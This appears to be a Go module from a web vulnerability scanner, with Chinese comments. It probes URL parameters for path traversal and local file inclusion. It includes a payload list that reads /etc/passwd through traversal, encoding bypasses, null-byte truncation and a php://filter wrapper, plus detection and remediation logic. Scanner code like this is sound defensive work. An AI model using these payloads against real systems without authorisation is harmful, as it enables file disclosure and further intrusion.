package injection

import (
	"encoding/base64"
	"fmt"
	"regexp"

	"github.com/Kur1sulab/kara/engine-go/litmus/scan"
)

// ================================================================ 路径穿越 / 文件包含

// lfiPayloads raw=true 的项已经按 wire 形式编码好（%2f、%00、%252f），
// 直接塞进查询串；再编码一次服务端只会收到字面量百分号，绕过技巧全部失效。
var lfiPayloads = []struct {
	label, text string
	raw         bool
}{
	{"相对穿越", "../../../../etc/passwd", false},
	{"深层相对穿越", "../../../../../../../../etc/passwd", false},
	{"绝对路径", "/etc/passwd", false},
	{"过滤绕过 ....//", "....//....//....//....//etc/passwd", false},
	{"编码穿越", "..%2f..%2f..%2f..%2fetc%2fpasswd", true},
	{"双重编码穿越", "..%252f..%252f..%252f..%252fetc%252fpasswd", true},
	{"空字节截断", "/etc/passwd%00", true},
	{"php filter 包装器", "php://filter/convert.base64-encode/resource=/etc/passwd", false},
}

// passwdRe /etc/passwd 的 root 行（兼容 root 密码字段非空的系统）
var passwdRe = regexp.MustCompile(`root:[^:\r\n]*:0:0`)

// b64BlobRe php://filter 输出的 base64 块
var b64BlobRe = regexp.MustCompile(`[A-Za-z0-9+/]{40,}={0,2}`)

// matchPasswd 在响应里找 /etc/passwd 内容。返回 (命中的行, 来源说明)。
func matchPasswd(text string) (string, string) {
	if m := passwdRe.FindString(text); m != "" {
		return m, "明文"
	}
	for _, blob := range b64BlobRe.FindAllString(text, 3) {
		raw, err := base64.StdEncoding.DecodeString(blob)
		if err != nil {
			continue
		}
		if m := passwdRe.FindString(string(raw)); m != "" {
			return m, "base64 解码"
		}
	}
	return "", ""
}

func runLFI(c *scan.Ctx) scan.Result {
	p, na := prepare(c)
	if na != nil {
		return *na
	}
	pts, total := pointsOf(c, 12, nil)
	if len(pts) == 0 {
		return scan.Skip(noPointReason(c))
	}
	o := &outcome{points: len(pts)}
	o.noteTruncated(total, len(pts))

	for _, pt := range pts {
		if p.blockedMsg != "" {
			break
		}
		b := p.fetch(get(pt.rawURL))
		if !b.ok() {
			o.fail("基线不可达 " + pt.endpoint() + "：" + b.errText())
			continue
		}
		o.okPoints++
		if hit, _ := matchPasswd(b.text); hit != "" {
			o.note("基线响应已含 " + hit + "，该点不做结论")
			continue
		}
		found := false
		for _, pl := range lfiPayloads {
			var u string
			if pl.raw {
				u = pt.withValueEncoded(pl.text)
			} else {
				u = pt.withValueOnly(pl.text)
			}
			r := p.fetch(get(u))
			if !r.ok() {
				o.fail("payload 请求失败：" + r.errText())
				continue
			}
			hit, how := matchPasswd(r.text)
			if hit == "" {
				continue
			}
			// 复现一次，避免「偶发错误页里恰好有一行 root:x:0:0」
			r2 := p.fetch(get(u))
			hit2, _ := matchPasswd(r2.text)
			if !r2.ok() || hit2 == "" {
				continue
			}
			o.add(newFinding(c, metaLFI, findingOpts{
				sev:   "high",
				level: "L2",
				conf:  "confirmed",
				evidence: fmt.Sprintf("参数: %s = %s\npayload（%s）: %s\n请求: GET %s\n基线: HTTP %d / %dB / 无 /etc/passwd 内容\npayload 响应: HTTP %d / %dB / %s命中 %q\n片段: %s\n二次请求复现: 是",
					pt.name, pt.value, pl.label, pl.text, u, b.status(), b.length(),
					r.status(), r.length(), how, hit, snippetCI(r.text, "root:", 90)),
				repro:  curlGet(u),
				impact: "可读取服务端任意可读文件（配置、密钥、源码、/etc/shadow 视权限而定），常常是进一步提权与横向的起点。",
				fix:    "不要用用户输入拼文件路径；改用固定映射表 + filepath.Clean 后校验仍在白名单目录内，并禁用 php:// 等包装器。",
				extra: map[string]interface{}{
					"path": pathOf(u), "param": pt.name, "payload": pl.text,
					"decode": how, "line": hit,
				},
			}))
			found = true
			break
		}
		if found {
			continue
		}
	}
	return o.result(p)
}
